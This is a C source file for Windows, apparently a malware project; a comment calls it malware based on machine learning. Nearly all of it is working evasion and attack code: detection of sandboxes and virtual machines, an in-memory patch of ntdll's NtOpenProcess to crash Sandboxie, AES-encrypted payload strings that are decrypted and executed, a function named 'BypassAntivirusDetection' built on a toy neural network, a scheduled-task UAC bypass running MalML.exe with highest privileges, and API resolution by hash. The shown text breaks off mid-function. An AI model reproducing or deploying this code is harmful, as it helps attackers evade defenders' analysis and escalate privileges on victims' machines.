﻿#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <math.h>
#include <windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <iphlpapi.h> // Include this for IP_ADAPTER_INFO
#include <intrin.h>   // For checking CPU features
#include <openssl/aes.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <sddl.h>
#include <wmiutils.h>  // Custom header for WMI utilities
#include <wbemidl.h>
#include <objbase.h>  // Include this for COM functions
#include <oleauto.h>  // Include for OLE Automation functions
#include <stdbool.h>
#include <wincrypt.h>

#define INPUT_SIZE 3
#define OUTPUT_SIZE 1
#define LEARNING_RATE 0.01
#define NUM_ITERATIONS 1000
#define AES_BLOCK_SIZE 16
#define SLEEP_DURATION 1000 // 1 second for demonstration
#ifndef TH32CS_PROCESS
#define TH32CS_PROCESS 0x00000002
#endif

#define INITIAL_HIDDEN_SIZE 5 // Initial number of hidden nodes
#define INITIAL_LEARNING_RATE 0.01
#define ERROR_THRESHOLD 0.1
#define PERFORMANCE_THRESHOLD 0.7 // Threshold for dynamically expanding the network

#pragma comment(lib, "ole32.lib")  // Link against OLE32 for COM functions
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "libcrypto.lib") // Link against OpenSSL's crypto library
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "oleaut32.lib")  // Link against OLEAUT32 for Variant functions

bool Is64BitProcess();

// Simulate feature extraction from the environment
typedef struct {
    float cpuUsage;    
    float memoryUsage; 
    int sandboxDetected; 
} EnvironmentFeatures;

unsigned char iv[AES_BLOCK_SIZE] = {0};

void AES_Encrypt(const unsigned char *input, unsigned char *output, const unsigned char *key) {
    AES_KEY enc_key;
    AES_set_encrypt_key(key, 128, &enc_key);
    AES_encrypt(input, output, &enc_key);
}

void AES_Decrypt(const unsigned char *input, unsigned char *output, const unsigned char *key) {
    AES_KEY dec_key;
    AES_set_decrypt_key(key, 128, &dec_key);
    AES_decrypt(input, output, &dec_key);
}

float* GetMockEnvironmentFeatures() {
    static float mockFeatures[3];
    mockFeatures[0] = 25.0; // Example CPU usage
    mockFeatures[1] = 4096; // Example memory usage in MB
    mockFeatures[2] = 0; // Sandbox detected (0 = false, 1 = true)
    return mockFeatures;
}

EnvironmentFeatures GetCurrentEnvironmentFeatures() {
    EnvironmentFeatures features;
    float* mockFeatures = GetMockEnvironmentFeatures();
    features.cpuUsage = mockFeatures[0];
    features.memoryUsage = mockFeatures[1];
    features.sandboxDetected = (int)mockFeatures[2];
    return features;
}

BOOL IsVMXEnabled() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] & (1 << 5)) != 0; // Check if VMX is enabled
}

BOOL CheckForVMwareAndVirtualBox() {
    HRESULT hres;
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    IEnumWbemClassObject *pEnumerator = NULL;
    IWbemClassObject *pclsObj = NULL;
    ULONG uReturn = 0;

    // Initialize COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return FALSE;

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
                                 RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE;
    }

    // Create WMI locator
    hres = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                             &IID_IWbemLocator, (LPVOID *)&pLoc);
    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE;
    }

    // Connect to WMI
    hres = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\CIMV2", NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) {
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return FALSE;
    }

hres = CoSetProxyBlanket(
    (IUnknown *)pSvc,              // Cast to IUnknown
    RPC_C_AUTHN_WINNT,            // Authentication service
    RPC_C_AUTHZ_NONE,             // Authorization service
    NULL,                          // Server principal name
    RPC_C_AUTHN_LEVEL_CALL,       // Authentication level
    RPC_C_IMP_LEVEL_IMPERSONATE,  // Impersonation level
    NULL,                          // Client identity
    EOAC_NONE);                   // Capabilities

    if (FAILED(hres)) {
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return FALSE;
    }

    hres = pSvc->lpVtbl->ExecQuery(pSvc, 
                                    L"WQL", 
                                    L"SELECT * FROM Win32_ComputerSystem",
                                    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                    NULL, &pEnumerator);
    if (FAILED(hres)) {
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return FALSE;
    }

    while (pEnumerator) {
        ULONG uReturn = 0;
        hres = pEnumerator->lpVtbl->Next(pEnumerator, 10000, 1, &pclsObj, &uReturn);

        if (uReturn == 0) {
            break;
        }

        VARIANT vtProp;

        hres = pclsObj->lpVtbl->Get(pclsObj, L"Manufacturer", 0, &vtProp, 0, 0);
        char manufacturer[256];
        WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, manufacturer, sizeof(manufacturer), NULL, NULL);
        VariantClear(&vtProp);

        hres = pclsObj->lpVtbl->Get(pclsObj, L"Model", 0, &vtProp, 0, 0);
        char model[256];
        WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, model, sizeof(model), NULL, NULL);
        VariantClear(&vtProp);

        if ((strstr(manufacturer, "microsoft corporation") && strstr(model, "VIRTUAL")) ||
            strstr(manufacturer, "vmware")) {
            pclsObj->lpVtbl->Release(pclsObj);
            pEnumerator->lpVtbl->Release(pEnumerator);
            pSvc->lpVtbl->Release(pSvc);
            pLoc->lpVtbl->Release(pLoc);
            CoUninitialize();
            return TRUE;
        }

        pclsObj->lpVtbl->Release(pclsObj);
    }

    pEnumerator->lpVtbl->Release(pEnumerator);
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();
    
    return FALSE;
}

BOOL AnyRunCheck() {
    const char *uuids[] = {
        "bb926e54-e3ca-40fd-ae90-2764341e7792",
        "90059c37-1320-41a4-b58d-2b75a9850d2f",
        "a7d1e876-18f3-4e37-8c8e-51b6b02a2e2a",
        "f89c1641-b7a2-4d25-9a4d-9295e812de7b",
        "e5c49b76-3b57-414f-b530-d25660f3d91d"
    };
    
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
                     "SOFTWARE\\Microsoft\\Cryptography", 
                     0, 
                     KEY_READ, 
                     &hKey) == ERROR_SUCCESS) {
        
        char machineGuid[37];
        DWORD size = sizeof(machineGuid);
        if (RegQueryValueEx(hKey, "MachineGuid", NULL, NULL, (LPBYTE)machineGuid, &size) == ERROR_SUCCESS) {
            for (int i = 0; i < sizeof(uuids) / sizeof(uuids[0]); i++) {
                if (strcmp(uuids[i], machineGuid) == 0) {
                    RegCloseKey(hKey);
                    return TRUE;
                }
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

BOOL CheckForQemu() {
    const char *badDriversList[] = { "qemu-ga", "qemuwmi" };
    char systemDir[MAX_PATH];

    if (GetSystemDirectory(systemDir, MAX_PATH) == 0) {
        return FALSE;
    }

    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*.*", systemDir);

    WIN32_FIND_DATA findData;
    HANDLE hFind = FindFirstFile(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        for (int i = 0; i < sizeof(badDriversList) / sizeof(badDriversList[0]); i++) {
            if (strstr(findData.cFileName, badDriversList[i]) != NULL) {
                FindClose(hFind);
                return TRUE;
            }
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
    return FALSE;
}

BOOL CheckForHyperV() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == NULL) {
        return FALSE;
    }

    DWORD bytesNeeded = 0;
    DWORD servicesReturned = 0;
    DWORD resumeHandle = 0;
    ENUM_SERVICE_STATUS *pServices = NULL;

    EnumServicesStatus(hSCManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle);
    if (bytesNeeded == 0) {
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    pServices = (ENUM_SERVICE_STATUS *)malloc(bytesNeeded);
    if (pServices == NULL) {
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    if (!EnumServicesStatus(hSCManager, SERVICE_WIN32, SERVICE_STATE_ALL, pServices, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle)) {
        free(pServices);
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    const char *servicesToCheck[] = { "vmbus", "VMBusHID", "hyperkbd" };
    for (DWORD i = 0; i < servicesReturned; i++) {
        for (int j = 0; j < sizeof(servicesToCheck) / sizeof(servicesToCheck[0]); j++) {
            if (strstr(pServices[i].lpServiceName, servicesToCheck[j]) != NULL) {
                free(pServices);
                CloseServiceHandle(hSCManager);
                return TRUE; // Hyper-V detected
            }
        }
    }

    free(pServices);
    CloseServiceHandle(hSCManager);
    return FALSE; // Hyper-V not detected
}

bool Is64BitProcess() {
    BOOL is64Bit = FALSE;
    // Check if the process is running under WOW64
    if (IsWow64Process(GetCurrentProcess(), &is64Bit)) {
        return !is64Bit;
    }
    return false;
}

bool CheckDevices() {
    const char *devices[] = {
        "\\\\.\\pipe\\cuckoo",
        "\\\\.\\HGFS",
        "\\\\.\\vmci",
        "\\\\.\\VBoxMiniRdrDN",
        "\\\\.\\VBoxGuest",
        "\\\\.\\pipe\\VBoxMiniRdDN",
        "\\\\.\\VBoxTrayIPC",
        "\\\\.\\pipe\\VBoxTrayIPC"
    };

    for (int i = 0; i < sizeof(devices) / sizeof(devices[0]); i++) {
        HANDLE hFile = CreateFileA(devices[i], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            return true; 
        }
    }
    return false;
}

#include <tlhelp32.h>
bool CheckIsProcessCritical(HANDLE processHandle) {
    DWORD processId = GetProcessId(processHandle);
    
    HANDLE tokenHandle;
    if (OpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle)) {
        TOKEN_PRIVILEGES privileges;
        DWORD size;

        LUID seDebugPrivilege;
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &seDebugPrivilege)) {
            if (GetTokenInformation(tokenHandle, TokenPrivileges, &privileges, sizeof(privileges), &size)) {
                for (DWORD i = 0; i < privileges.PrivilegeCount; i++) {
                    if (privileges.Privileges[i].Luid.LowPart == seDebugPrivilege.LowPart &&
                        privileges.Privileges[i].Luid.HighPart == seDebugPrivilege.HighPart &&
                        (privileges.Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
                        CloseHandle(tokenHandle);
                        return true;
                    }
                }
            }
        }
        CloseHandle(tokenHandle);
    }

    const char *criticalProcesses[] = {
        "System",
        "smss.exe",
        "csrss.exe",
        "wininit.exe",
        "services.exe",
        "lsass.exe",
        "svchost.exe"
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_PROCESS, 0);
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry)) {
        do {
            if (entry.th32ProcessID == processId) {
                for (int i = 0; i < sizeof(criticalProcesses) / sizeof(criticalProcesses[0]); i++) {
                    if (strcmp(entry.szExeFile, criticalProcesses[i]) == 0) {
                        CloseHandle(snapshot);
                        return true;
                    }
                }
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return false;
}

bool CrashingSandboxie() {
    if (!Is64BitProcess()) {
        unsigned char unHookedCode[] = { 0xB8, 0x26, 0x00, 0x00, 0x00 };
        HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
        if (ntdllModule) {
            FARPROC ntOpenProcess = GetProcAddress(ntdllModule, "NtOpenProcess");
            if (ntOpenProcess) {
                DWORD oldProtect;
                VirtualProtect(ntOpenProcess, sizeof(unHookedCode), PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(ntOpenProcess, unHookedCode, sizeof(unHookedCode));
                VirtualProtect(ntOpenProcess, sizeof(unHookedCode), oldProtect, &oldProtect);
            }
        }

        DWORD processIds[1024], bytesReturned;
        if (EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
            for (unsigned int i = 0; i < (bytesReturned / sizeof(DWORD)); i++) {
                HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processIds[i]);
                if (processHandle) {
                    bool isCritical = CheckIsProcessCritical(processHandle);
                    if (isCritical) {
                        // Logic for handling critical processes, logging or skipping
                    }
                    CloseHandle(processHandle);
                }
            }
        }
    }
    return true;
}

BOOL DetectSandbox() {
    SYSTEM_POWER_STATUS powerStatus;
    DWORDLONG gpuMemory = 0;

    if (GetSystemPowerStatus(&powerStatus)) {
        if (powerStatus.BatteryLifePercent == 100 || powerStatus.ACLineStatus != 1) {
            return TRUE;
        }
    }

    if (GetPhysicallyInstalledSystemMemory(&gpuMemory)) {
        if (gpuMemory < (4 * 1024 * 1024)) {
            return TRUE;
        }
    }

    PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG adapterInfoSize = sizeof(IP_ADAPTER_INFO);

    if (adapterInfo == NULL || GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
        free(adapterInfo);
        return TRUE;
    }

    if (strstr(adapterInfo->Description, "VMware") || strstr(adapterInfo->Description, "Virtual")) {
        free(adapterInfo);
        return TRUE;
    }

    if (CheckForVMwareAndVirtualBox()) {
        free(adapterInfo);
        return TRUE;
    }

    if (AnyRunCheck()) {
        free(adapterInfo);
        return TRUE;
    }

    if (CheckForQemu()) {
        free(adapterInfo);
        return TRUE;
    }

    if (CheckForHyperV()) {
        free(adapterInfo);
        return TRUE;
    }

    if (CheckDevices()) {
        free(adapterInfo);
        return TRUE;
    } 

    if (CrashingSandboxie()) {
        free(adapterInfo);
        return TRUE;
    }

    free(adapterInfo);
    return FALSE;
}

typedef struct {
    int hidden_size;
    float learning_rate;
    float* weights_input_hidden;
    float* weights_hidden_output;
    float* hidden_layer;
    float* output_layer;
} DynamicNeuralNetwork;

DynamicNeuralNetwork InitializeDynamicNeuralNetwork(int hidden_size, float learning_rate) {
    DynamicNeuralNetwork nn;
    nn.hidden_size = hidden_size;
    nn.learning_rate = learning_rate;

    nn.weights_input_hidden = (float*)malloc(INPUT_SIZE * hidden_size * sizeof(float));
    nn.weights_hidden_output = (float*)malloc(hidden_size * OUTPUT_SIZE * sizeof(float));
    nn.hidden_layer = (float*)malloc(hidden_size * sizeof(float));
    nn.output_layer = (float*)malloc(OUTPUT_SIZE * sizeof(float));

    for (int i = 0; i < INPUT_SIZE * hidden_size; i++) {
        nn.weights_input_hidden[i] = (float)(rand() % 100) / 100.0f;
    }
    for (int i = 0; i < hidden_size * OUTPUT_SIZE; i++) {
        nn.weights_hidden_output[i] = (float)(rand() % 100) / 100.0f;
    }

    return nn;
}

float Sigmoid(float x) {
    return (float)(1.0 / (1.0 + exp(-x)));
}

void FeedForward(DynamicNeuralNetwork* nn, float inputs[INPUT_SIZE]) {
    for (int i = 0; i < nn->hidden_size; i++) {
        float sum = 0.0f;
        for (int j = 0; j < INPUT_SIZE; j++) {
            sum += inputs[j] * nn->weights_input_hidden[j * nn->hidden_size + i];
        }
        nn->hidden_layer[i] = Sigmoid(sum);
    }

    for (int i = 0; i < OUTPUT_SIZE; i++) {
        float sum = 0.0f;
        for (int j = 0; j < nn->hidden_size; j++) {
            sum += nn->hidden_layer[j] * nn->weights_hidden_output[j * OUTPUT_SIZE + i];
        }
        nn->output_layer[i] = Sigmoid(sum);
    }
}

void ExpandNeuralNetwork(DynamicNeuralNetwork* nn) {
    int new_hidden_size = nn->hidden_size + 1;

    nn->weights_input_hidden = (float*)realloc(nn->weights_input_hidden, INPUT_SIZE * new_hidden_size * sizeof(float));
    nn->weights_hidden_output = (float*)realloc(nn->weights_hidden_output, new_hidden_size * OUTPUT_SIZE * sizeof(float));
    nn->hidden_layer = (float*)realloc(nn->hidden_layer, new_hidden_size * sizeof(float));

    for (int i = 0; i < INPUT_SIZE; i++) {
        nn->weights_input_hidden[i * new_hidden_size + new_hidden_size - 1] = (float)(rand() % 100) / 100.0f;
    }
    for (int i = 0; i < OUTPUT_SIZE; i++) {
        nn->weights_hidden_output[(new_hidden_size - 1) * OUTPUT_SIZE + i] = (float)(rand() % 100) / 100.0f;
    }

    nn->hidden_size = new_hidden_size;
    printf("[+] Expanded Neural Network : New Hidden Size = %d\n", nn->hidden_size);
}

void AdjustLearningRate(DynamicNeuralNetwork* nn, float error) {
    if (error < ERROR_THRESHOLD) {
        nn->learning_rate *= 1.05;
    } else {
        nn->learning_rate *= 0.95;
    }
    printf("[+] Adjusted Learning Rate  : %f\n", nn->learning_rate);
}

int BypassAntivirusDetection(DynamicNeuralNetwork* nn, EnvironmentFeatures features) {
    float inputs[INPUT_SIZE] = {
        features.cpuUsage / 100.0f,     
        features.memoryUsage / 8192.0f,  
        (float)features.sandboxDetected   
    };
    
    FeedForward(nn, inputs);
    
    return (nn->output_layer[0] > 0.5f) ? 1 : 0; 
}

void TrainDynamicNeuralNetwork(DynamicNeuralNetwork* nn, float inputs[INPUT_SIZE], int expected) {
    FeedForward(nn, inputs);

    float output_error = expected - nn->output_layer[0];

    AdjustLearningRate(nn, fabs(output_error));

    float delta_output = output_error * nn->output_layer[0] * (1 - nn->output_layer[0]);
    for (int i = 0; i < nn->hidden_size; i++) {
        nn->weights_hidden_output[i * OUTPUT_SIZE] += nn->learning_rate * delta_output * nn->hidden_layer[i];
    }

    for (int i = 0; i < nn->hidden_size; i++) {
        float hidden_error = delta_output * nn->weights_hidden_output[i * OUTPUT_SIZE];
        float delta_hidden = hidden_error * nn->hidden_layer[i] * (1 - nn->hidden_layer[i]);
        for (int j = 0; j < INPUT_SIZE; j++) {
            nn->weights_input_hidden[j * nn->hidden_size + i] += nn->learning_rate * delta_hidden * inputs[j];
        }
    }

    if (fabs(output_error) > PERFORMANCE_THRESHOLD) {
        ExpandNeuralNetwork(nn);
    }
}

void EncryptPayload(const char *payload, unsigned char *encryptedPayload, const unsigned char *key, unsigned char *iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    
    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);

    int len;
    int ciphertext_len;

    EVP_EncryptUpdate(ctx, encryptedPayload, &len, (unsigned char*)payload, strlen(payload));
    ciphertext_len = len;

    EVP_EncryptFinal_ex(ctx, encryptedPayload + len, &len);
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);
}

void DecryptPayload(unsigned char *encryptedPayload, int encryptedLength, char *decryptedPayload, const unsigned char *key, unsigned char *iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

    EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);

    int len;
    int plaintext_len;

    EVP_DecryptUpdate(ctx, (unsigned char*)decryptedPayload, &len, encryptedPayload, encryptedLength);
    plaintext_len = len;

    EVP_DecryptFinal_ex(ctx, (unsigned char*)decryptedPayload + len, &len);
    plaintext_len += len;

    decryptedPayload[plaintext_len] = '\0';
    EVP_CIPHER_CTX_free(ctx);
}

void ExecuteCommand(const char* command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL,   // No module name (use command line)
        (LPSTR)command,        // Command line
        NULL,                 // Process handle not inheritable
        NULL,                 // Thread handle not inheritable
        FALSE,                // Set handle inheritance to FALSE
        0,                    // No creation flags
        NULL,                 // Use parent's environment block
        NULL,                 // Use parent's starting directory 
        &si,                  // Pointer to STARTUPINFO structure
        &pi)                  // Pointer to PROCESS_INFORMATION structure
    ) {
        printf("{[-]} CreateProcess failed (%d).\n", GetLastError());
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void TrimToValidPath(char* path) {
    for (int len = strlen(path); len > 0; len--) {
        path[len] = '\0'; 
        if (ValidateExecutablePath(path)) {
            return;
        }
    }
    path[0] = '\0';
}



// ###### Test 

// Function to decrypt data with AES
void aes_decrypt(const unsigned char *input, unsigned char *output, const unsigned char *key) {
    AES_KEY decryptKey;
    AES_set_decrypt_key(key, 128, &decryptKey); // Set AES-128 decryption key
    AES_decrypt(input, output, &decryptKey);    // Perform decryption
}

unsigned char* unpad_output(unsigned char *output, int *output_length) {
    int padding = output[*output_length - 1]; // Last byte indicates the number of padding bytes
    *output_length -= padding; // Adjust output length
    output[*output_length] = '\0'; // Null-terminate the output
    return output;
}


void AdvaML_DL_Obfuscation_Techniques(DynamicNeuralNetwork* nn) {
    unsigned char encryptedPayload[128];
    char decryptedPayload[128];
    unsigned char iv[AES_BLOCK_SIZE];

    RAND_bytes(iv, AES_BLOCK_SIZE);

    const unsigned char key[] = "PANjiiehfrzauefhuzebfhIHE(-è_çà)àz(_è-'è_ç$$$$$$$$#############~[{€Zkarçà@@@~$$*p=NothingsT0_S33";

    memset(iv, 0, sizeof(iv));

    //////////////////////////
    unsigned char encrypted_string1[] = {
    0x27, 0xC2, 0xC7, 0x1A, 0xFC, 0x42, 0xCA, 0x5F,
    0x2F, 0x64, 0x4A, 0x91, 0x78, 0x24, 0x96, 0xD1,
    0x68, 0x16, 0xE0, 0x10, 0x72, 0x30, 0x19, 0xC4,
    0x23, 0xFA, 0x39, 0x50, 0x91, 0xFF, 0x5D, 0xF8
    };

    int padded_length1 = sizeof(encrypted_string1);

    unsigned char *decrypted_string1 = (unsigned char*)malloc(padded_length1);
    if (decrypted_string1 == NULL) {
        exit(EXIT_FAILURE);
    }

    int num_blocks1 = padded_length1 / AES_BLOCK_SIZE;
    for (int i = 0; i < num_blocks1; i++) {
        aes_decrypt(encrypted_string1 + i * AES_BLOCK_SIZE, decrypted_string1 + i * AES_BLOCK_SIZE, key);
    }

    int decrypted_length1 = padded_length1;
    unpad_output(decrypted_string1, &decrypted_length1);
    //unsigned char encryptedPayloadthtrhrth = decrypted_string1;        // = "C:\\Windows\\System32\\cmd.exe";
    /////////////////////////
 


    EncryptPayload(decrypted_string1, encryptedPayload, key, iv); // C:\Users\Administrator\Desktop\ C:\\Windows\\System32\\cmd.exe

    unsigned char encrypted_string[] = {
    0x49, 0xEE, 0xD0, 0xB9, 0x87, 0x73, 0xCF, 0x29,
    0x6C, 0x1D, 0xBC, 0xD5, 0x6B, 0x83, 0xA0, 0xA7,
    0xA9, 0x94, 0x23, 0x4A, 0x5C, 0x7C, 0x99, 0xB4,
    0x94, 0x30, 0xCC, 0xD0, 0x74, 0xF0, 0xB2, 0xB2
    };

    int padded_length = sizeof(encrypted_string);

    unsigned char *decrypted_string = (unsigned char*)malloc(padded_length);
    if (decrypted_string == NULL) {
        exit(EXIT_FAILURE);
    }

    int num_blocks = padded_length / AES_BLOCK_SIZE;
    for (int i = 0; i < num_blocks; i++) {
        aes_decrypt(encrypted_string + i * AES_BLOCK_SIZE, decrypted_string + i * AES_BLOCK_SIZE, key);
    }

    int decrypted_length = padded_length;
    unpad_output(decrypted_string, &decrypted_length);
    printf(decrypted_string); // printf("{[#]} Encrypted Payload : ");
    /////////////////////////
    // printf("{[#]} Encrypted Payload : ");




    for (int i = 0; i < sizeof(encryptedPayload); i++) {
        printf("%02x ", encryptedPayload[i]);
    }
    printf("\n");

    if (IsVMXEnabled()) {
        printf("{[!]} VMX is enabled, potential virtual environment detected.\n");
        Sleep(SLEEP_DURATION);
    }

    while (1) {
        EnvironmentFeatures features = GetCurrentEnvironmentFeatures();
        if (BypassAntivirusDetection(nn, features)) {
            DecryptPayload(encryptedPayload, sizeof(encryptedPayload), decryptedPayload, key, iv);
            decryptedPayload[sizeof(decryptedPayload) - 1] = '\0';

            TrimToValidPath(decryptedPayload);
            printf("{[#]} Trimmed Decrypted Payload : %s\n", decryptedPayload, "\n\n");

            if (ValidateExecutablePath(decryptedPayload)) {
                ExecuteCommand(decryptedPayload);
                break;
            } else {
                printf("{[-]} Decrypted payload is not a valid executable path.\n");
                break;
            }
        } else {
            printf("{[-]} Antivirus detection bypass failed, not executing payload.\n");
            Sleep(SLEEP_DURATION);
        }
    }

   unsigned char encrypted_string22[] = {
    0x2D, 0x8E, 0xDD, 0x18, 0xD2, 0x29, 0x76, 0x74,
    0xDD, 0x9A, 0x13, 0xC9, 0x8A, 0x43, 0xAF, 0x45,
    0x70, 0xF3, 0x62, 0xB9, 0x1F, 0xD2, 0x67, 0xEC,
    0xC6, 0x9B, 0xEB, 0x3C, 0x8A, 0x3F, 0x35, 0x1E,
    0x70, 0xF3, 0x62, 0xB9, 0x1F, 0xD2, 0x67, 0xEC,
    0xC6, 0x9B, 0xEB, 0x3C, 0x8A, 0x3F, 0x35, 0x1E,
    0x02, 0x9B, 0xA9, 0xD6, 0xBE, 0x76, 0xD0, 0xAF,
    0x2B, 0x4C, 0x7B, 0xE7, 0x5E, 0xA6, 0x43, 0xDB,
    0xC4, 0x6D, 0xD2, 0xE6, 0x3D, 0xAB, 0xA5, 0x71,
    0x35, 0xE7, 0xB9, 0x6C, 0x93, 0xC0, 0xDB, 0xAD,
    0x36, 0x19, 0x09, 0xDB, 0x72, 0xB4, 0x25, 0x30,
    0x9B, 0x5E, 0x88, 0xA2, 0xE8, 0xF2, 0x6F, 0x81,
    0x70, 0xF3, 0x62, 0xB9, 0x1F, 0xD2, 0x67, 0xEC,
    0xC6, 0x9B, 0xEB, 0x3C, 0x8A, 0x3F, 0x35, 0x1E,
    0x70, 0xF3, 0x62, 0xB9, 0x1F, 0xD2, 0x67, 0xEC,
    0xC6, 0x9B, 0xEB, 0x3C, 0x8A, 0x3F, 0x35, 0x1E,
    0x65, 0x8D, 0xB5, 0xB0, 0xED, 0x55, 0x7B, 0xC5,
    0x7E, 0x43, 0x72, 0x45, 0x2C, 0xA3, 0x79, 0xD4
    };

    int padded_length22 = sizeof(encrypted_string22);

    unsigned char *decrypted_string22 = (unsigned char*)malloc(padded_length22);
    if (decrypted_string22 == NULL) {
        exit(EXIT_FAILURE);
    }

    int num_blocks22 = padded_length22 / AES_BLOCK_SIZE;
    for (int i = 0; i < num_blocks22; i++) {
        aes_decrypt(encrypted_string22 + i * AES_BLOCK_SIZE, decrypted_string22 + i * AES_BLOCK_SIZE, key);
    }

    int decrypted_length22 = padded_length22;
    unpad_output(decrypted_string22, &decrypted_length22);
    printf(decrypted_string22); // printf("{[#]} Encrypted Payload : ");

    // printf("\r\r==============================================\n+ This Is Mlaware Based Via Machine learning\n==============================================\n\n");
}

// ####### End Test

int ValidateExecutablePath(const char* path) {
    DWORD fileAttr = GetFileAttributes(path);
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        return 0;
    }
    return !(fileAttr & FILE_ATTRIBUTE_DIRECTORY);
}

void SimpleObfuscation(char* code) {
    for (int i = 0; code[i] != '\0'; i++) {
        code[i] += 3;
    }
}

void SimpleDeobfuscation(char* code) {
    for (int i = 0; code[i] != '\0'; i++) {
        code[i] -= 3;
    }
}


void BypassUAC() {
    const char* taskName = "BypassUAC";
    
    SYSTEMTIME st;
    GetSystemTime(&st);
    
    st.wMinute += 1;
    if (st.wMinute >= 60) {
        st.wMinute = 0;
        st.wHour += 1;
    }
    if (st.wHour >= 24) {
        st.wHour = 0; // Reset to 0 if it goes past midnight (rare case)
    }

    // Format the time as HH:mm
    char timeStr[6];
    sprintf(timeStr, "%02d:%02d", st.wHour, st.wMinute);

    char command[512];
    sprintf(command, "schtasks /create /tn \"%s\" /tr \"C:\\Users\\Administrator\\Deskto\\RandomNewMalwaresProjects\\MalML.exe\" /sc once /st %s /rl highest /f", taskName, timeStr);

    system(command);

    sprintf(command, "schtasks /run /tn \"%s\"", taskName);
    system(command);

    sprintf(command, "schtasks /delete /tn \"%s\" /f", taskName);
    system(command);

    printf("{[#]} UAC Bypass executed successfully!\n");
}

void runCommand(const char *command) {
    int result = system(command);
    if (result == -1) {
        perror("{[-]} Error executing command");
    }
}

DWORD hash_api_name(const char* api_name) {
    DWORD hash = 0xFFFFFFFF;
    while (*api_name) {
        hash ^= *api_name++;
        for (int i = 0; i < 8; ++i) {
            if (hash & 1)
                hash = (hash >> 1) ^ 0xEDB88320;
            else
                hash >>= 1;
        }
    }
    return ~hash;
}

typedef struct {
    DWORD api_hash;
    FARPROC api_address;
} api_entry;

enum API_INDEX {
    CREATE_PROCESS_WITH_TOKEN_W,
    API_COUNT
};

FARPROC resolve_api_by_hash(HMODULE module, DWORD hash) {
    char* base_addr = (char*)module;
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)base_addr;
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)(base_addr + dos_header->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)(base_addr +
        nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

